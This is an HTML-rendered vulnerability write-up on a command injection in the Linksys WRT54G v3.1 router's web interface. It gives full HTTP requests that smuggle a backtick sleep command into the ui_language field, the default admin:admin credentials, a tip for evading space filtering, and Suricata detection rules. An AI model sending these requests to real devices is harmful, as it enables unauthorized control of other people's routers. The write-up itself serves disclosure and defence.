<!DOCTYPE html>
<html>
<head>
<title>0034-linksys-wrt54g-v3.1-writeup.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="linksys-wrt54g---v31">Linksys WRT54G - v3.1</h1>
<p>Published: March 24, 2020</p>
<p>This write up will go over how I found an exploited a command injection vulnerability in a <code>Linksys WRT54G</code> Small Office / Home Office router.</p>
<p>I downloaded the firmware for <code>Linksys WRT54G</code> version <code>3.1</code> from here:</p>
<p><a href="https://downloads.linksys.com/downloads/firmware/1224638367382/FW_WRT54Gv4_4.21.5.000_20120220.bin">https://downloads.linksys.com/downloads/firmware/1224638367382/FW_WRT54Gv4_4.21.5.000_20120220.bin</a></p>
<p>Note that this firmware file is from 2012. According to <a href="https://www.linksys.com/us/support-article?articleNum=291978">this link</a>, the end of life (EOL) date for this device was:</p>
<blockquote>
<p>Prior to 2012</p>
</blockquote>
<p>Since this device has been EOL'd for <strong>at least</strong> eight years (if not more), I am publishing this write up without reaching out to the vendor since it is unlikely to be patched at this point.  If you are still using this equipment, valid countermeasures to protect aginst this vulnerability include changing the default credentials for your router. Suricata rules are also included at the bottom of this write up.</p>
<h2 id="hunting-for-command-injection">Hunting for Command Injection</h2>
<p>Next I extracted the squashfs filesystem from the <code>FW_WRT54Gv4_4.21.5.000_20120220.bin</code> file using <code>binwalk -eM FW_WRT54Gv4_4.21.5.000_20120220.bin</code>.</p>
<p>Before I begin command injection testing, I want to know whether or not the <code>telnetd</code> or <code>utelnetd</code> binaries exist on the firmware filesystem, so I do a quick <code>find . -iname &quot;*telnet*&quot;</code>.  I don't find any results, so I will have to fall back to the <code>/bin/sleep</code> methodology for command injection testing. This methodology focuses on timing differences when a <code>sleep</code> sub-command is injected into a call to <code>system</code>.</p>
<p>Opening up <code>/usr/sbin/httpd</code> in Ghidra, we can start to look for command injection vulnerabilities. I start with the <code>system</code> function and viewing all instances of this function in the binary:</p>
<p><img src="images/0034-system-calls.png" alt="&quot;System Calls&quot;" title="System Calls"></p>
<p>The first few calls are located in a function called <code>do_upgrade_post</code>, which by reading through it we can infer that this is the function that handles the configuration restore feature at the url path <code>/restore.cgi</code>.</p>
<p><img src="images/0034-command-injection.png" alt="&quot;Command Injection&quot;" title="Command Injection"></p>
<p>The following code is particularly interesting:</p>
<pre class="hljs"><code><div>puVar7 = (undefined *)nvram_get(<span class="hljs-string">"ui_language"</span>);
uVar8 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">if</span> (puVar7 == (undefined *)<span class="hljs-number">0x0</span>) {
  puVar7 = &amp;DAT_0047a2b8;
}
<span class="hljs-built_in">snprintf</span>(acStack88,<span class="hljs-number">0x40</span>,<span class="hljs-string">"cp /www/%s_lang_pack/captmp.js /tmp/."</span>,puVar7);
system(acStack88);
</div></code></pre>
<p>In other words, if we can control the value of the NVRAM parameter <code>ui_language</code>, we can exploit this vulnerability.</p>
<p>It turns out we can control this value without any filtering happening on the server.  The following HTTP request demonstrates setting a malicious value for <code>ui_language</code> and 'primes' the vulnerability:</p>
<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">http://192.168.1.1/apply.cgi</span> HTTP/1.1
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 682
<span class="hljs-attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=
<span class="hljs-attribute">Referer</span>: http://192.168.1.1/apply.cgi
<span class="hljs-attribute">Host</span>: 192.168.1.1

<span class="sas">submit_button=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;change_action</span>=gozila_cgi<span class="hljs-variable">&amp;submit_type</span>=language<span class="hljs-variable">&amp;action</span>=<span class="hljs-variable">&amp;now_proto</span>=dhcp<span class="hljs-variable">&amp;daylight_time</span>=0<span class="hljs-variable">&amp;lan_ipaddr</span>=4<span class="hljs-variable">&amp;wait_time</span>=0<span class="hljs-variable">&amp;need_reboot</span>=0<span class="hljs-variable">&amp;ui_language</span>=%60%2fbin%2fsleep%24%7BIFS%7D23%60<span class="hljs-variable">&amp;wan_proto</span>=dhcp<span class="hljs-variable">&amp;router_name</span>=asdf<span class="hljs-variable">&amp;wan_hostname</span>=<span class="hljs-variable">&amp;wan_domain</span>=<span class="hljs-variable">&amp;mtu_enable</span>=0<span class="hljs-variable">&amp;lan_ipaddr_0</span>=192<span class="hljs-variable">&amp;lan_ipaddr_1</span>=168<span class="hljs-variable">&amp;lan_ipaddr_2</span>=1<span class="hljs-variable">&amp;lan_ipaddr_3</span>=1<span class="hljs-variable">&amp;lan_netmask</span>=255.255.255.0<span class="hljs-variable">&amp;lan_proto</span>=dhcp<span class="hljs-variable">&amp;dhcp_check</span>=<span class="hljs-variable">&amp;dhcp_start</span>=100<span class="hljs-variable">&amp;dhcp_num</span>=50<span class="hljs-variable">&amp;dhcp_lease</span>=0<span class="hljs-variable">&amp;wan_dns</span>=4<span class="hljs-variable">&amp;wan_dns0_0</span>=0<span class="hljs-variable">&amp;wan_dns0_1</span>=0<span class="hljs-variable">&amp;wan_dns0_2</span>=0<span class="hljs-variable">&amp;wan_dns0_3</span>=0<span class="hljs-variable">&amp;wan_dns1_0</span>=0<span class="hljs-variable">&amp;wan_dns1_1</span>=0<span class="hljs-variable">&amp;wan_dns1_2</span>=0<span class="hljs-variable">&amp;wan_dns1_3</span>=0<span class="hljs-variable">&amp;wan_dns2_0</span>=0<span class="hljs-variable">&amp;wan_dns2_1</span>=0<span class="hljs-variable">&amp;wan_dns2_2</span>=0<span class="hljs-variable">&amp;wan_dns2_3</span>=0<span class="hljs-variable">&amp;wan_wins</span>=4<span class="hljs-variable">&amp;wan_wins_0</span>=0<span class="hljs-variable">&amp;wan_wins_1</span>=0<span class="hljs-variable">&amp;wan_wins_2</span>=0<span class="hljs-variable">&amp;wan_wins_3</span>=0<span class="hljs-variable">&amp;time_zone</span>=-08+1+1<span class="hljs-variable">&amp;_daylight_time</span>=1
</span></div></code></pre>
<p>The value we have chosen is:</p>
<pre class="hljs"><code><div>`/bin/sleep<span class="hljs-variable">${IFS}</span>23`
</div></code></pre>
<p>If invoked in the target <code>system</code> function, it will cause the system to sleep for 23 seconds before continuing processing the request and eventually responding.</p>
<p>If we run the prime request and immediately follow it with an exploit request, we can achieve command injection.  The exploit request is:</p>
<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">http://192.168.1.1/restore.cgi</span> HTTP/1.1
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36
<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------169284500162711627955704791
<span class="hljs-attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=
<span class="hljs-attribute">Content-Length</span>: 362
<span class="hljs-attribute">Referer</span>: http://192.168.1.1/Backup_Restore.asp
<span class="hljs-attribute">Host</span>: 192.168.1.1

<span class="applescript"><span class="hljs-comment">-----------------------------169284500162711627955704791</span>
Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"submit_button"</span>

Backup_Restore
<span class="hljs-comment">-----------------------------169284500162711627955704791</span>
Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"restore"</span>; filename=<span class="hljs-string">"WRT54GV2_v4.21.5.cfg"</span>
Content-Type: <span class="hljs-built_in">application</span>/octet-stream

<span class="hljs-comment">-----------------------------169284500162711627955704791--</span>
</span></div></code></pre>
<p>Pay attention to the length of time it takes for this request to complete.  The request normally takes 5-6 seconds to complete; if you run the 'prime' request first, that length of time will extend past 23 seconds to between 28-30 seconds.  This is because <code>sleep 23</code> is being passed along to the <code>system</code> function and the kernel is subsequently waiting 23 seconds to resume processing.</p>
<h2 id="analysis">Analysis</h2>
<p>Both requests are authenticated and the exploit requires two web requests.  In reality, this is probably not a very practical exploit.  Even if the default credentials are set at <code>admin:admin</code> and you can make the two web requests, there is no easy way to gain an interactive shell since the prerequisite binaries for the telnet daemon are not present.  Also since this command injection does not return any output (&quot;blind&quot; command injection), it is not useful for retrieving data from the device.  One could conceivably compile their own busybox <code>telnetd</code> binary and retrieve it over HTTP using <code>wget</code> (which is installed in the firmware at <code>/usr/bin/wget</code>).  Keep in mind the <code>ui_language</code> parameter expects no space characters, and the command injection seems to fail if any space characters are present in the payload.  Use <code>${IFS}</code> in place of spaces.</p>
<h2 id="suricata-rules-to-protect-yourself">Suricata Rules to Protect Yourself</h2>
<h3 id="suricata-50">Suricata 5.0</h3>
<pre class="hljs"><code><div>alert http any any -&gt; $HOME_NET any (msg:&quot;ET EXPLOIT Linksys WRT54G Version 3.1 Command Injection Attempt&quot;; flow:established,to_server; http.method; content:&quot;POST&quot;; http.header; content:&quot;Authorization|3a 20|Basic|20|&quot;; http.uri; content:&quot;/apply.cgi&quot;; startswith; http.request_body; content:&quot;change_action=gozila_cgi&quot;; fast_pattern; content:&quot;submit_type=language&quot;; content:&quot;&amp;ui_language=&quot;; pcre:&quot;/^[(?:\x60|%60)(?:\x27|%27)]/R&quot;; classtype:attempted-admin; sid:1; rev:1;) 
</div></code></pre>
<h3 id="suricata-40">Suricata 4.0</h3>
<pre class="hljs"><code><div>alert http any any -&gt; $HOME_NET any (msg:&quot;ET EXPLOIT Linksys WRT54G Version 3.1 Command Injection Attempt&quot;; flow:established,to_server; content:&quot;POST&quot;; http_method; content:&quot;Authorization|3a 20|Basic|20|&quot;; http_header; content:&quot;/apply.cgi&quot;; http_uri; depth:10; content:&quot;change_action=gozila_cgi&quot;; http_client_body; fast_pattern; content:&quot;submit_type=language&quot;; http_client_body; content:&quot;&amp;ui_language=&quot;; http_client_body; pcre:&quot;/^[(?:\x60|%60)(?:\x27|%27)]/PR&quot;; classtype:attempted-admin; sid:1; rev:1;)
</div></code></pre>
<p>Thanks to <a href="https://twitter.com/zoomequipd">@zoomequipd</a> for the rules.</p>
<p><a href="https://nstarke.github.io/">Back</a></p>

</body>
</html>
